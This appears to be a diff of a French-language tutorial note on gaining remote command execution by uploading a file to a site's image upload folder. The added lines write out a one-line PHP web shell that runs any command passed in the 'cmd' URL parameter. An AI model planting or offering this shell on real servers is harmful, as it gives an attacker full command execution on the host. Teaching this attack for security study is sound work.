@@ -18,4 +18,12 @@ Admettons que nous avons trouvé que nos images sont stocké dans le dossier *up
 
 ![[remote_controle_execution1.png]]
 
-On peut maintenant essayer d'upload un executeur de , pour ce faire nous allons créer un fichier PHP puis nous allons utiliser 
+On peut maintenant essayer d'upload un **executeur de commande**, pour ce faire nous allons créer un fichier PHP contenant ce code :
+
+```php
+<?php  
+    echo system($_GET["cmd"]); // affiche le resultat de la commande passé en paramètre  
+?>
+```
+
+
